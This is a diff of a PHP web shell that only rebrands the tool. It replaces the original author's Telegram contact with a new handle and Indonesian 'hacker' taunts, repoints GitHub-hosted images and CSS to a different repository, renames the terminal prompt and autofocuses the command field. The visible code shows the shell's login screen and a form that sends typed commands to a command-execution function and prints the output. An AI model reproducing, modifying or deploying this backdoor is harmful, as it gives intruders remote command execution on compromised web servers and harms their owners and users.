@@ -1,6 +1,10 @@
 <?php
 /*
-Need Something? https://t.me/zaynphantomhive
+Mau Recode Izin Dek! https://haxorstars.t.me
+Anti enc enc club kaya lu nub
+Kalo Recode Minimal Tambah Fitur Dek Jangan Numpang Nama Doang Nub!
+Salam Heker Pro
+-NuLz @haxorstars
 */
 
 //head
@@ -516,7 +520,7 @@ if (empty($_SESSION['login'])) {
     }
 
     body {
-        background-image: url('https://raw.githubusercontent.com/z4phyr/z4p-code/main/assets/scleton.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
+        background-image: url('https://raw.githubusercontent.com/haxorstars/archive/main/media/scleton.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
         background-position: center;
         background-size: cover;
         background-repeat: no-repeat;
@@ -783,7 +787,7 @@ if (empty($_SESSION['login'])) {
 <body>
     <div class="terminal">
         <div class="headerTerm">
-            <img src="https://raw.githubusercontent.com/z4phyr/z4p-code/main/assets/terminal.png"
+            <img src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png"
                 alt="terminal" /><span>Terminal</span>
             <strong>
                 <?= $s_he_ll_Name ?> Login
@@ -803,7 +807,7 @@ if (empty($_SESSION['login'])) {
     <script type="text/javascript">
     var root = document.querySelector(".root");
     var name = `
-                                ╭──[root@z4phyXNulz]<br>
+                                ╭──[root@nulzhaxorstars]<br>
                                 ╰──➤
                                 `;
     root.innerHTML = name;
@@ -877,7 +881,7 @@ $path = str_replace("\\", "/", $path);
     <!-- Flowbite -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />
     <!-- For Text Editor -->
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/z4p-code/main/css/style.css">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/haxorstars/archive/main/text-editor/main.css">
     <style id="style2" type="text/css"></style>
     <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css"
         rel="stylesheet" />
@@ -1925,7 +1929,7 @@ $path = str_replace("\\", "/", $path);
         <form class="md:w-10/12 w-full mt-4 mx-2 mb-12 pb-12" style="height: 70vh;" action="" method="POST">
             <div class="flex">
                 <span class="inline-flex text-white fs-xl">$</span>
-                <input type="text" id="komendnya" name="komendnya" class="komendnya ubuntu-mono mb-1 w-full h-10 bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none" value="'.$_POST['komendnya'].'">
+                <input type="text" id="komendnya" name="komendnya" class="komendnya ubuntu-mono mb-1 w-full h-10 bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none" autofocus value="'.$_POST['komendnya'].'">
             </div>
             <textarea name="nulzcmd" id="nulzcmd" readonly class="nulzcmd ubuntu-mono px-4 py-2 mt-1 w-full h-full bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none '.$txtEmerald.'">'.NuLzCmd(trim(htmlspecialchars(stripslashes($_POST['komendnya'])))).'</textarea>
         </form>
